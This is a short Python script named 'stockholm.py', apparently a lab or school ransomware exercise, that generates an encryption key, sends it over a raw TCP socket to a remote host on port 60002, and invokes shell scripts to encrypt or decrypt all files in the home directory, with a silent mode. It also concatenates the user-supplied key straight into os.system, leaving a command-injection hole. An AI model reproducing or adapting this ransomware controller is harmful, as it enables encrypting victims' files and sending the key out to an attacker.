import argparse
import os
from cryptography.fernet import Fernet
import socket

def parse():
	parser = argparse.ArgumentParser(
		prog = 'python3 stockholm.py', 
		description = 'encrypt/decrypt all files in home dir'
	)	
	parser.add_argument('-v', '--version', action='version', version='Stockholm 1.0')
	parser.add_argument('-r', '--reverse', nargs=1, help='decrypt files', default = None)
	parser.add_argument('-s', '--silent', action='store_true', help = 'silent mode', default = False)
	args = parser.parse_args()
	return args.__dict__

def give_key(key):
	host = 'host.docker.internal'
	port = 60002
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((host, port))
		s.send(key)
		s.send(b'\n')

if __name__ == "__main__":
	dict = parse()
	silent = str(int(dict.get("silent")))
	key = dict.get("reverse")
	if (key):
		os.system("./to_decrypt.sh " + key[0] + " " + silent)
	else:
		key = Fernet.generate_key()
		try:
			give_key(key)
		except Exception:
			print(key.decode())
		key = key.decode()
		os.system("./to_encrypt.sh " + key + " " + silent)